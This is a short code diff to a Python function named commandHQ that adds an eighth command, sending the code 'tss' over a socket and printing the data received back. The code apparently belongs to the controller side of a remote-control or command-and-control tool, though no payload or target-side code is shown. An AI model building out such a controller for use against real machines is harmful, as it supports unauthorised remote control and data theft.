@@ -166,6 +166,16 @@ def commandHQ():
                 ans = True
             except:
                 reload()
+                
+        if command == "8":
+            try:
+                message = str(['tss'])
+                message = message.encode()
+                
+                conn.send(message)
+                ans = True
+            except:
+                reload()
 
         if(ans == False): commandHQ()
 
@@ -194,6 +204,9 @@ def commandHQ():
                 print(format + "Data received: {}".format(incoming_message[1]))
                 
             if incoming_message[0] == "ecmdc": # 7
+                print(format + "Data received: {}".format(incoming_message[1]))
+                
+            if incoming_message[0] == "tss": # 8
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
